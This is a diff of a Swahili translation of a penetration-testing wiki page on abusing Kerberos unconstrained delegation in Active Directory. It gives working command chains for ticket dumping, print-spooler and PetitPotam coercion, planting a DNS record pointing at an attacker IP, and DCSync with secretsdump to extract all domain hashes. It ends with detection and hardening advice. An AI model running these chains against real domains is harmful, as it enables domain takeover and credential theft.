@@ -4,11 +4,11 @@
 
 ## Unconstrained delegation
 
-Hiki ni kipengele ambacho Domain Administrator anaweza kuweka kwenye **Computer** yoyote ndani ya domain. Kisha, kila mara **user anapoingia** kwenye Computer hiyo, **nakala ya TGT** ya user huyo **itatumwa ndani ya TGS** iliyotolewa na DC **na kuhifadhiwa kwenye memory ndani ya LSASS**. Kwa hiyo, ikiwa una privileges za Administrator kwenye machine hiyo, utaweza **kudump tickets na ku-impersonate users** kwenye machine yoyote.
+Hiki ni kipengele ambacho Domain Administrator anaweza kuweka kwenye **Computer** yoyote ndani ya domain. Kisha, kila mara **user anapo-login** kwenye Computer hiyo, **copy ya TGT** ya user huyo **itatumwa ndani ya TGS** inayotolewa na DC **na kuhifadhiwa kwenye memory ya LSASS**. Kwa hiyo, ikiwa una privileges za Administrator kwenye mashine hiyo, utaweza **kudump tickets na ku-impersonate users** kwenye mashine yoyote.
 
-Kwa hiyo, ikiwa domain admin ataingia kwenye Computer iliyo na kipengele cha "Unconstrained Delegation" kilichoamilishwa, na una local admin privileges ndani ya machine hiyo, utaweza kudump ticket na ku-impersonate Domain Admin popote (domain privesc).
+Kwa hiyo, ikiwa domain admin ana-login kwenye Computer iliyo na kipengele cha "Unconstrained Delegation" kimewashwa, na una local admin privileges kwenye mashine hiyo, utaweza kudump ticket na ku-impersonate Domain Admin mahali popote (domain privesc).
 
-Unaweza **kutafuta Computer objects zenye attribute hii** kwa kuangalia kama attribute ya [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) ina [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>). Unaweza kufanya hivi kwa kutumia LDAP filter ya ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, ambayo ndiyo inayotumiwa na powerview:
+Unaweza **kupata Computer objects zilizo na attribute hii** kwa kuangalia ikiwa attribute ya [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) ina [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>). Unaweza kufanya hivi kwa LDAP filter ya ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, ambayo ndiyo inayotumiwa na powerview:
 ```bash
 # List unconstrained computers
 ## Powerview
@@ -30,39 +30,39 @@ kerberos::list /export #Another way
 Rubeus.exe dump
 Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
 ```
-Pakia ticket ya Administrator (au mtumiaji mwathiriwa) kwenye memory kwa kutumia **Mimikatz** au **Rubeus kwa** [**Pass the Ticket**](pass-the-ticket.md)**.**\
-Maelezo zaidi: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
-[**Maelezo zaidi kuhusu Unconstrained delegation kwenye ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)<sup>[[2]](#references)[[3]](#references)</sup>
+Pakia tiketi ya Administrator (au user aliyeathirika) kwenye memory kwa kutumia **Mimikatz** au **Rubeus for a** [**Pass the Ticket**](pass-the-ticket.md)**.**\
+Maelezo zaidi: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)<sup>[[2]](#references)</sup>\
+[**Maelezo zaidi kuhusu Unconstrained delegation katika ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)<sup>[[2]](#references)[[3]](#references)</sup>
 
 ### **Force Authentication**
 
-Ikiwa attacker ataweza **ku-compromise computer iliyoruhusiwa kwa "Unconstrained Delegation"**, anaweza **kudanganya** **Print server** ili **iji-login kiotomatiki** dhidi yake, na hivyo **kuhifadhi TGT** kwenye memory ya server.\
-Kisha, attacker anaweza kutekeleza **Pass the Ticket attack ili ku-impersonate** computer account ya Print server.
+Ikiwa attacker ataweza **ku-compromise computer iliyoruhusiwa kwa "Unconstrained Delegation"**, anaweza **kudanganya** **Print server** ili **ku-login automatically** dhidi yake, na hivyo **kuhifadhi TGT** kwenye memory ya server.\
+Kisha, attacker anaweza kufanya **Pass the Ticket attack ili ku-impersonate** computer account ya user Print server.
 
-Ili kufanya print server iji-login dhidi ya machine yoyote, unaweza kutumia [**SpoolSample**](https://github.com/leechristensen/SpoolSample):
+Ili kufanya print server i-login dhidi ya machine yoyote, unaweza kutumia [**SpoolSample**](https://github.com/leechristensen/SpoolSample):
 ```bash
 .\SpoolSample.exe <printmachine> <unconstrinedmachine>
 ```
-Ikiwa TGT imetoka kwa domain controller, unaweza kufanya [**DCSync attack**](acl-persistence-abuse/index.html#dcsync) na kupata hash zote kutoka kwa DC.\
-[**Maelezo zaidi kuhusu attack hii kwenye ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)<sup>[[10]](#references)</sup>
+Ikiwa TGT inatoka kwa domain controller, unaweza kutekeleza [**DCSync attack**](acl-persistence-abuse/index.html#dcsync) na kupata hashes zote kutoka kwa DC.\
+[**Maelezo zaidi kuhusu attack hii katika ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)<sup>[[10]](#references)</sup>
 
-Tazama hapa njia nyingine za **kulazimisha authentication:**
+Pata hapa njia nyingine za **force an authentication:**
 
 
 {{#ref}}
 printers-spooler-service-abuse.md
 {{#endref}}
 
-Primitive nyingine yoyote ya coercion inayomfanya victim a-authenticate kwa kutumia **Kerberos** kwenye host yako yenye unconstrained-delegation itafanya kazi pia. Katika mazingira ya kisasa, hii mara nyingi humaanisha kubadilisha mtiririko wa kawaida wa PrinterBug na kutumia **PetitPotam**, **DFSCoerce**, **ShadowCoerce**, **MS-EVEN**, au coercion inayotumia **WebClient/WebDAV**, kulingana na RPC surface inayoweza kufikiwa.
+Coercion primitive nyingine yoyote inayomfanya victim authenticate kwa **Kerberos** kwenye host yako ya unconstrained-delegation itafanya kazi pia. Katika mazingira ya kisasa, mara nyingi hii humaanisha kubadilisha classic PrinterBug flow na **PetitPotam**, **DFSCoerce**, **ShadowCoerce**, **MS-EVEN**, au coercion inayotegemea **WebClient/WebDAV**, kulingana na RPC surface inayoweza kufikiwa.
 
 ### Kutumia vibaya user/service account yenye unconstrained delegation
 
-Unconstrained delegation **haijazuiliwa kwa computer objects pekee**. **User/service account** pia inaweza kusanidiwa kama `TRUSTED_FOR_DELEGATION`. Katika hali hiyo, hitaji la msingi ni kwamba account hiyo ipokee Kerberos service tickets kwa **SPN inayomilikiwa nayo**.
+Unconstrained delegation **haizuiliwi kwa computer objects pekee**. **User/service account** pia inaweza kusanidiwa kama `TRUSTED_FOR_DELEGATION`. Katika hali hiyo, hitaji la kivitendo ni kwamba account hiyo ipokee Kerberos service tickets za **SPN inayomiliki**.
 
-Hii huleta njia 2 za kawaida sana za offensive:
+Hii huleta njia 2 zinazotumika sana za offensive:
 
 1. Unapata password/hash ya **user account** yenye unconstrained-delegation, kisha **unaongeza SPN** kwenye account hiyo hiyo.
-2. Account hiyo tayari ina SPN moja au zaidi, lakini moja kati ya hizo inaelekeza kwenye **hostname iliyopitwa na wakati/iliyoondolewa**; kuunda upya **DNS A record** inayokosekana kunatosha hijack authentication flow bila kurekebisha SPN set.<sup>[[8]](#references)</sup>
+2. Account hiyo tayari ina SPN moja au zaidi, lakini mojawapo inaelekeza kwenye **stale/decommissioned hostname**; kuunda upya **DNS A record** iliyokosekana kunatosha hijack authentication flow bila kurekebisha SPN set.<sup>[[8]](#references)</sup>
 
 Minimal Linux flow:
 ```bash
@@ -90,17 +90,17 @@ python3 printerbug.py '<DOMAIN>/svc_kud:<PASS>'@<DC_FQDN> kud-listener.<DOMAIN_F
 KRB5CCNAME=DC1\\$@<DOMAIN_FQDN>_krbtgt@<DOMAIN_FQDN>.ccache \
 secretsdump.py -k -no-pass -just-dc <DOMAIN_FQDN>/ -dc-ip <DC_IP>
 ```
-Maelezo:
+Notes:
 
-- Hii ni muhimu hasa wakati principal iliyo na **unconstrained delegation** ni **service account** na una credentials zake pekee, bila code execution kwenye host iliyounganishwa.
-- Ikiwa user anayelengwa tayari ana **stale SPN**, kuunda tena **DNS record** inayolingana kunaweza kuwa na kelele kidogo kuliko kuandika SPN mpya kwenye AD.
-- Tradecraft ya hivi karibuni inayolenga Linux hutumia `addspn.py`, `dnstool.py`, `krbrelayx.py`, na primitive moja ya coercion; huhitaji kugusa host ya Windows ili kukamilisha chain.
+- Hii ni muhimu hasa wakati principal ya unconstrained delegation ni **service account** na una credentials zake pekee, bila code execution kwenye host iliyounganishwa.
+- Ikiwa user lengwa tayari ana **stale SPN**, kuunda tena **DNS record** inayolingana kunaweza kuwa na kelele ndogo kuliko kuandika SPN mpya kwenye AD.
+- Tradecraft ya hivi karibuni inayolenga Linux hutumia `addspn.py`, `dnstool.py`, `krbrelayx.py`, na primitive moja ya coercion; huhitaji kugusa Windows host ili kukamilisha chain.
 
-### Kutumia Unconstrained Delegation vibaya kwa computer iliyoundwa na attacker
+### Kutumia Unconstrained Delegation vibaya kwa kutumia computer iliyoundwa na mshambuliaji
 
-Domains za kisasa mara nyingi huwa na `MachineAccountQuota > 0` (default 10), hivyo kuruhusu principal yoyote iliyo-authenticate kuunda hadi N computer objects. Ikiwa pia una token privilege ya `SeEnableDelegationPrivilege` (au rights zinazolingana), unaweza kuweka computer mpya iwe trusted kwa unconstrained delegation na kuvuna inbound TGTs kutoka kwa mifumo yenye privileges.<sup>[[1]](#references)</sup>
+Domains za kisasa mara nyingi huwa na `MachineAccountQuota > 0` (default 10), jambo linaloruhusu principal yoyote iliyothibitishwa kuunda hadi N computer objects. Ikiwa pia una token privilege ya `SeEnableDelegationPrivilege` (au rights zinazolingana), unaweza kuweka computer mpya iaminike kwa unconstrained delegation na kukusanya TGTs zinazoingia kutoka kwenye mifumo yenye privileges.<sup>[[1]](#references)</sup>
 
-Mtiririko wa kiwango cha juu:
+Mtiririko wa juu:
 
 1) Unda computer unayoidhibiti
 ```bash
@@ -114,13 +114,13 @@ python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
 --action add --record <FAKEHOST>.<DOMAIN_FQDN> --type A --data <ATTACKER_IP> \
 -dns-ip <DC_IP> <DC_FQDN>
 ```
-3) Wezesha Unconstrained Delegation kwenye kompyuta inayodhibitiwa na mshambuliaji
+3) Washa Unconstrained Delegation kwenye kompyuta inayodhibitiwa na mshambulizi
 ```bash
 # Requires SeEnableDelegationPrivilege (commonly held by domain admins or delegated admins)
 # BloodyAD example
 bloodyAD -d <DOMAIN_FQDN> -u <USER> -p '<PASS>' --host <DC_FQDN> add uac '<FAKEHOST>$' -f TRUSTED_FOR_DELEGATION
 ```
-Kwa nini hii inafanya kazi: kwa unconstrained delegation, LSA kwenye computer iliyowezeshwa kwa delegation huhifadhi TGT zinazoingia. Ukimdanganya DC au server yenye privileges athibitishe kwenye fake host yako, machine TGT yake itahifadhiwa na inaweza ku-export.
+Kwa nini hii inafanya kazi: kwa unconstrained delegation, LSA kwenye computer iliyowezeshwa kwa delegation hu-cache TGT zinazoingia. Ukimdanganya DC au server yenye privileged authentication kwenye fake host yako, machine TGT yake itahifadhiwa na inaweza ku-export.
 
 4) Anzisha krbrelayx katika export mode na uandae Kerberos material
 ```bash
@@ -131,18 +131,18 @@ python3 krbrelayx.py --aesKey <AES256_KEY> -dc-ip <DC_IP>
 # Alternative if you know the password and correct Kerberos salt:
 python3 krbrelayx.py --krbpass '<Strong.Passw0rd>' --krbsalt '<CASE_SENSITIVE_SALT>' -dc-ip <DC_IP>
 ```
-5) Lazimisha authentication kutoka kwa DC/servers kwenda kwenye fake host yako
+5) Lazimisha authentication kutoka kwa DC/servers hadi kwenye fake host yako
 ```bash
 # netexec (CME fork) coerce_plus module supports multiple coercion vectors
 # Common options: METHOD=PrinterBug|PetitPotam|DFSCoerce|MSEven
 netexec smb <DC_FQDN> -u '<FAKEHOST>$' -p '<Strong.Passw0rd>' -M coerce_plus -o LISTENER=<FAKEHOST>.<DOMAIN_FQDN> METHOD=PrinterBug
 ```
-krbrelayx itahifadhi faili za ccache mashine inapothibitisha utambulisho, kwa mfano:
+krbrelayx itahifadhi faili za ccache wakati mashine inapothibitisha utambulisho, kwa mfano:
 ```
 Got ticket for DC1$@DOMAIN.TLD [krbtgt@DOMAIN.TLD]
 Saving ticket in DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache
 ```
-6) Tumia TGT ya mashine ya DC iliyonaswa kufanya DCSync
+6) Tumia TGT ya mashine ya DC iliyonaswa kutekeleza DCSync
 ```bash
 # Create a krb5.conf for the realm (netexec helper)
 netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
@@ -156,26 +156,24 @@ netexec smb <DC_FQDN> --use-kcache --ntds
 KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
 secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
 ```
-Notes and requirements:
-
-- `MachineAccountQuota > 0` huwezesha uundaji wa computer usiohitaji privileges; vinginevyo unahitaji rights zilizoainishwa wazi.
+- `MachineAccountQuota > 0` huwezesha uundaji wa computer bila privileges; vinginevyo unahitaji rights zilizoainishwa wazi.
 - Kuweka `TRUSTED_FOR_DELEGATION` kwenye computer kunahitaji `SeEnableDelegationPrivilege` (au domain admin).
 - Hakikisha name resolution ya fake host yako (DNS A record) ili DC iweze kuifikia kwa FQDN.
-- Coercion inahitaji vector inayofanya kazi (PrinterBug/MS-RPRN, EFSRPC/PetitPotam, DFSCoerce, MS-EVEN, n.k.). Zima hizi kwenye DCs ikiwezekana.
-- Ikiwa victim account imewekwa alama ya **"Account is sensitive and cannot be delegated"** au ni member wa **Protected Users**, TGT iliyoforwardiwa haitajumuishwa kwenye service ticket, hivyo chain hii haitatoa TGT inayoweza kutumika tena.<sup>[[9]](#references)</sup>
-- Ikiwa **Credential Guard** imewashwa kwenye authenticating client/server, Windows huzuia **Kerberos unconstrained delegation**, jambo linaloweza kufanya coercion paths zinazofanya kazi vinginevyo zishindwe kwa mtazamo wa operator.
+- Coercion inahitaji vector inayofanya kazi (PrinterBug/MS-RPRN, EFSRPC/PetitPotam, DFSCoerce, MS-EVEN, n.k.). Zima hizi kwenye DCs inapowezekana.
+- Ikiwa victim account imewekwa alama ya **"Account is sensitive and cannot be delegated"** au ni mwanachama wa **Protected Users**, forwarded TGT haitajumuishwa kwenye service ticket; kwa hivyo chain hii haitatoa TGT inayoweza kutumika tena.<sup>[[9]](#references)</sup>
+- Ikiwa **Credential Guard** imewezeshwa kwenye authenticating client/server, Windows huzuia **Kerberos unconstrained delegation**, jambo linaloweza kufanya coercion paths zinazofanya kazi vinginevyo zishindwe kwa mtazamo wa operator.
 
-Detection and hardening ideas:
+Mawazo ya detection na hardening:
 
-- Toa alert kwa Event ID 4741 (computer account created) na 4742/4738 (computer/user account changed) wakati UAC `TRUSTED_FOR_DELEGATION` imewekwa.
-- Fuatilia uongezaji usio wa kawaida wa DNS A-records kwenye domain zone.
-- Chunguza ongezeko kubwa la 4768/4769 kutoka kwa hosts zisizotarajiwa na DC-authentications kwenda kwenye non-DC hosts.
-- Weka `SeEnableDelegationPrivilege` kwa set ndogo kabisa, weka `MachineAccountQuota=0` inapowezekana, na zima Print Spooler kwenye DCs. Tekeleza LDAP signing na channel binding.
+- Toa alert kwenye Event ID 4741 (computer account created) na 4742/4738 (computer/user account changed) wakati UAC `TRUSTED_FOR_DELEGATION` imewekwa.
+- Fuatilia ongezeko lisilo la kawaida la DNS A-records kwenye domain zone.
+- Chunguza ongezeko kubwa la 4768/4769 kutoka kwa hosts zisizotarajiwa na DC-authentications zinazoelekezwa kwenye non-DC hosts.
+- Punguza `SeEnableDelegationPrivilege` kwa seti ndogo kabisa, weka `MachineAccountQuota=0` inapowezekana, na uzime Print Spooler kwenye DCs. Tekeleza LDAP signing na channel binding.
 
 ### Mitigation
 
-- Punguza DA/Admin logins kwa services maalum
-- Weka **"Account is sensitive and cannot be delegated"** kwa privileged accounts.
+- Punguza DA/Admin logins kwenye services mahususi.
+- Weka "Account is sensitive and cannot be delegated" kwa privileged accounts.
 
 ## References
 
